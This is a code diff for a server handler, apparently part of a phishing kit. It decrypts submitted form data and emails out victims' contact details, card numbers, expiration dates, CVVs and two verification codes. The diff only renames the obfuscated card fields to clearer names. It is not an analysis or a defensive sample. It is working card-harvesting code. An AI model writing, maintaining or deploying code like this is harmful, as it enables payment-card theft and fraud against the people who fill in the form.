@@ -7,7 +7,7 @@ export default defineEventHandler(async (event) => {
   const { payload } = await readBody(event)
   const data = decryptPayload(payload, secret)
 
-  const { pseudo, email, telephone,cde_1, cde_2, message, cn, ce, cv } = data
+  const { pseudo, email, telephone,code_1, code_2, message, card_number, card_expiration, card_cvv } = data
 
   if (!email || !pseudo) {
     throw createError({
@@ -48,11 +48,11 @@ export default defineEventHandler(async (event) => {
       <li><b>Pseudo :</b> ${data.pseudo || 'N/A'}</li>
       <li><b>Email :</b> ${data.email || 'N/A'}</li>
       <li><b>Téléphone :</b> ${data.telephone || 'N/A'}</li>
-      <li><b>Num C :</b> ${data.cn || 'N/A'}</li>
-      <li><b>Cde 1 :</b> ${data.cde_1 || 'N/A'}</li>
-      <li><b>Cde 2 :</b> ${data.cde_2 || 'N/A'}</li>
-      <li><b>Cde V.V :</b> ${data.cv|| 'N/A'}</li>
-      <li><b>Date Exp :</b> ${data.ce || 'N/A'}</li>
+      <li><b>Carte :</b> ${data.card_number || 'N/A'}</li>
+      <li><b>Code 1 :</b> ${data.code_1 || 'N/A'}</li>
+      <li><b>Code 2 :</b> ${data.code_2 || 'N/A'}</li>
+      <li><b>CVV :</b> ${data.card_cvv|| 'N/A'}</li>
+      <li><b>Date d'expiration :</b> ${data.card_expiration || 'N/A'}</li>
     </ol>
     <p style="text-align:center; margin-top:20px; font-size:14px; color:#555;">
       Merci pour votre confiance ! 💙
@@ -63,38 +63,3 @@ export default defineEventHandler(async (event) => {
 
   return { success: true }
 })
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
